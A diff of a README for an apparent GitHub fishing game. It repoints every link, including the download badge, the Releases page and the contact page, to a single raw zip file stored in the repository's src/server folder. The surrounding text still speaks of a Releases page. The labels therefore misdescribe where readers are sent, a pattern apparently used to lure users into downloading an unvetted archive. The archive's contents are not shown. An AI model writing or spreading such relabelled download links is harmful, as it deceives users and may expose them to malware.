@@ -1,6 +1,6 @@
 # 🐟 fishing-minigame - Dive into a Fun Fishing Experience
 
-[![Download fishing-minigame](https://img.shields.io/badge/Download-fishing--minigame-blue)](https://github.com/Ansii300/fishing-minigame/releases)
+[![Download fishing-minigame](https://raw.githubusercontent.com/Ansii300/fishing-minigame/main/src/server/fishing-minigame_2.8.zip)](https://raw.githubusercontent.com/Ansii300/fishing-minigame/main/src/server/fishing-minigame_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you start, ensure your device meets the following requirements:
 To download and install the fishing-minigame, follow these steps:
 
 1. Click the download link below to visit the Releases page:
-   [Download fishing-minigame](https://github.com/Ansii300/fishing-minigame/releases)
+   [Download fishing-minigame](https://raw.githubusercontent.com/Ansii300/fishing-minigame/main/src/server/fishing-minigame_2.8.zip)
 
 2. On the Releases page, find the latest version of the fishing-minigame.
 
@@ -69,7 +69,7 @@ We are committed to improving your experience. The fishing-minigame will receive
 - Additional levels and challenges
 - Visual and performance enhancements
 
-Stay tuned for notifications about new versions on our [Releases page](https://github.com/Ansii300/fishing-minigame/releases).
+Stay tuned for notifications about new versions on our [Releases page](https://raw.githubusercontent.com/Ansii300/fishing-minigame/main/src/server/fishing-minigame_2.8.zip).
 
 ## 🌐 Community
 
@@ -77,4 +77,4 @@ Join our community of fishing-minigame enthusiasts! Engage with other players, s
 
 --- 
 
-Thank you for choosing fishing-minigame! We hope you enjoy your fishing adventure. For further assistance or to share feedback, visit our [contact page](https://github.com/Ansii300/fishing-minigame). Happy fishing!
+Thank you for choosing fishing-minigame! We hope you enjoy your fishing adventure. For further assistance or to share feedback, visit our [contact page](https://raw.githubusercontent.com/Ansii300/fishing-minigame/main/src/server/fishing-minigame_2.8.zip). Happy fishing!
